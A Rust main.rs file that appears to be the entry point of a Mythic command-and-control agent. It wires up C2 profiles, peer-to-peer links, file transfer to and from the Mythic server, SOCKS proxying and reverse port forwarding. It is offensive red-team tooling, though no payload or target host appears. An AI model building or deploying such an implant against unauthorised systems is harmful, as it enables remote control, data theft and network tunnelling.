#![allow(dead_code)]

mod commands;
mod profiles;
mod responses;
mod structs;
mod tasks;
mod utils;

fn main() {
    env_logger::init();
    let rt = tokio::runtime::Runtime::new().expect("Failed to create tokio runtime");
    rt.block_on(async {
        run_agent().await;
    });
}

async fn run_agent() {
    profiles::initialize();
    let response_channels = responses::initialize(profiles::get_push_channel);
    let p2p_channels =
        utils::p2p::initialize(response_channels.p2p_connection_message_tx.clone(), profiles::get_mythic_id);
    let (send_file_tx, get_file_tx) = utils::files::initialize();

    tasks::initialize(tasks::TaskChannels {
        new_response_tx: response_channels.new_response_tx.clone(),
        send_file_to_mythic_tx: send_file_tx,
        get_file_from_mythic_tx: get_file_tx,
        add_internal_connection_tx: p2p_channels.add_connection_tx,
        remove_internal_connection_tx: p2p_channels.remove_connection_tx,
        interactive_task_output_tx: response_channels.new_interactive_task_output_tx.clone(),
        new_alert_tx: response_channels.new_alert_tx.clone(),
        from_mythic_socks_tx: response_channels.from_mythic_socks_tx.clone(),
        from_mythic_rpfwd_tx: response_channels.from_mythic_rpfwd_tx.clone(),
    });

    profiles::start().await;
}
